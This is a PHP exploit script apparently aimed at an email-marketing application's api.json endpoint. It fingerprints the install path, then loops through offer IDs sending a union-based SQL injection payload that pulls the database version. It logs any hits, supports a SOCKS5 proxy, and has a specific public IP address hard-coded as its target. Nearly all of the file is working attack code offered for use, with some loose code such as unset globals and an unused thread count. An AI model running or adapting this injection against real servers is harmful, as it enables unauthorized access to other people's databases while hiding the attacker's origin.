<?php

function get_path($url, $use_proxy, $proxy) {
    $url = "http://{$url}/api.json";
    $headers = [
        'Accept: application/json, text/plain, */*',
        'Cookie: iresponse_session=_cookie',
        'User-Agent: axios/1.6.7',
        'Accept-Encoding: gzip, compress, deflate, br',
        'Host: 127.0.0.1',
        'Connection: close'
    ];

    $response = make_get_request($url, $headers, $use_proxy, $proxy);
    
    if (!$response) {
        return "";
    }

    preg_match_all('/\/[a-zA-Z0-9._/-]+\.php/', $response, $matches);
    $path = "";
    if (!empty($matches[0])) {
        $path = $matches[0][0];
    }
    $path_parts = explode('/', $path);
    $path = implode('/', array_slice($path_parts, 0, 3)) . '/';
    
    return $path;
}

function make_get_request($url, $headers, $use_proxy, $proxy) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // Set up the proxy if enabled
    if ($use_proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "cURL error: " . curl_error($ch) . "\n";
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return $response;
}

function make_post_request($url, $offerId, $payload, $use_proxy, $proxy) {
    $url = "http://{$url}/api.json";
    $postData = http_build_query([
        'controller' => 'Tracking',
        'action' => 'getLink',
        'parameters[type]' => $payload,
        'parameters[process-id]' => '0',
        'parameters[process-type]' => 'md',
        'parameters[user-id]' => '1',
        'parameters[vmta-id]' => '104',
        'parameters[list-id]' => '0',
        'parameters[client-id]' => '0',
        'parameters[offer-id]' => $offerId,
        'parameters[ip]' => '127.0.0.1'
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    // Set up the proxy if enabled
    if ($use_proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "cURL error: " . curl_error($ch) . "\n";
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return json_decode($response, true);
}

function log_to_file($content, $filename = null) {
    global $log_file;
    file_put_contents($log_file, $content . "\n", FILE_APPEND);
    if ($filename) {
        file_put_contents($filename, $content . "\n", FILE_APPEND);
    }
}

function check_offer_id($url, $offerId, $payload, $stop_event, $use_proxy, $proxy) {
    global $results_dir;

    if ($stop_event) {
        return null;
    }

    $response = make_post_request($url, $offerId, $payload, $use_proxy, $proxy);
    if ($stop_event) {
        return null;
    }

    if ($response && isset($response['message']) && $response['message'] == "Link generated successfully !") {
        if (!$stop_event) {
            echo "Possible SQL Injection at Offer ID {$offerId}: " . json_encode($response) . "\n";
            $sanitized_url = str_replace(':', '_', $url);
            $result_file = "{$results_dir}/{$sanitized_url}.txt";
            log_to_file("Possible SQL Injection at Offer ID {$offerId}: " . json_encode($response), $result_file);

            $stop_event = true;
            return $offerId;
        }
    }

    return null;
}

function main() {
    global $url, $range_from, $range_to, $threads, $proxy_enabled, $socks5_proxy;

    $log_file = "vulnerability_log.txt";
    $results_dir = "Results";
    mkdir($results_dir, 0777, true);

    $use_proxy = $proxy_enabled;
    $proxy = $socks5_proxy;

    $path = get_path($url, $use_proxy, $proxy);
    echo "Application path: {$path}\n";
    log_to_file("Application path: {$path}");

    $version_payload = "nq['' union all select 'aa',(select version())]";

    $offerId_found = null;
    $stop_event = false;

    for ($i = $range_from; $i < $range_to; $i++) {
        $offerId = check_offer_id($url, $i, $version_payload, $stop_event, $use_proxy, $proxy);
        if ($offerId) {
            $offerId_found = $offerId;
            break;
        }
    }

    if ($offerId_found) {
        $sanitized_url = str_replace(':', '_', $url);
        $result_file = "{$results_dir}/{$sanitized_url}.txt";
        log_to_file("Application path: {$path}", $result_file);
    }
}

// Define variables
$url = "162.55.84.187";
$range_from = 0;
$range_to = 2000;
$threads = 50;
$proxy_enabled = false;
$socks5_proxy = "127.0.0.1:999";

// Start the main function
main();
